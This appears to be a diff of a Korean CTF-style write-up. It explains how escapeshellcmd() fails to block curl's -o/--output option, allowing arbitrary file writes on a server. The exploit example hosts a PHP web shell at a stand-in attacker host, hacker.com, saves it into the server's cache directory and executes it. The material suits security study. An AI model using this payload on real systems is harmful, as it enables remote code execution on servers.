@@ -1,7 +1,7 @@
 # 결론은.. RFI
-curl 명령어를 대신 실행해주는 웹 서버가 있습니다. 사용자는 url이라는 매개변수를 통해 URL을 입력할 수 있으며, 서버는 해당 URL의 결과를 별도의 캐시 파일로 특정 디렉터리에 저장하여 사용자가 이를 읽을 수 있도록 합니다. 그러나 악의적인 공격자가 악성 명령어를 삽입할 수 있어, 초기 보안 조치로 escapeshellcmd() 함수를 통해 사용자 입력에 대한 1차 필터링을 적용했습니다. 하지만 escapeshellcmd()가 하이픈(-) 필터링을 지원하지 않으므로, 사용자는 입력한 URL 뒤에 -o나 --output ./cache/test.php와 같은 옵션을 추가할 수 있습니다. (즉, 다시말해 서버 내 임의 파일 생성이 가능)
+curl 명령어를 대신 실행해주는 웹 서버가 있습니다. 사용자는 url이라는 매개변수를 통해 URL을 입력할 수 있으며, 서버는 해당 URL의 결과를 별도의 캐시 파일로 특정 디렉터리에 저장하여 사용자가 이를 읽을 수 있도록 합니다. 그러나 악의적인 공격자가 악성 명령어를 삽입할 수 있어, 초기 보안 조치로 escapeshellcmd() 함수를 통해 사용자 입력에 대한 1차 필터링을 적용했습니다. 하지만 escapeshellcmd()가 하이픈(-) 필터링을 지원하지 않으므로, 사용자는 입력한 URL 뒤에 `-o`나 `--output` 옵션을 추가할 수 있습니다. (즉, 다시말해 서버 내 임의 파일 생성이 가능)
 
-Exploit 예시: 공격자는 <?php system('/flag'); ?>가 포함된 파일을 자신이 운영하는 웹 서버에 저장합니다 (예: http://hacker.com/phpcode). 이후 공격자가 http://hacker.com/phpcode -o ./cache/test.php와 같은 입력을 전송하면 서버는 이 파일을 ./cache/test.php로 저장하게 되고, 최종적으로 http://curl.server/cache/test.php에 접속하면 해당 php코드가 실행되어 공격에 성공하게 됩니다.
+Exploit 예시: 공격자는 `<?php system('/flag'); ?>`가 포함된 파일을 자신이 운영하는 웹 서버에 저장합니다 (예: http://hacker.com/phpcode). 이후 공격자가 `http://hacker.com/phpcode -o ./cache/test.php`와 같은 입력을 전송하면 서버는 이 파일을 ./cache/test.php로 저장하게 되고, 최종적으로 http://curl.server/cache/test.php 에 접속하면 해당 php코드가 실행되어 공격에 성공하게 됩니다.
 
 
 
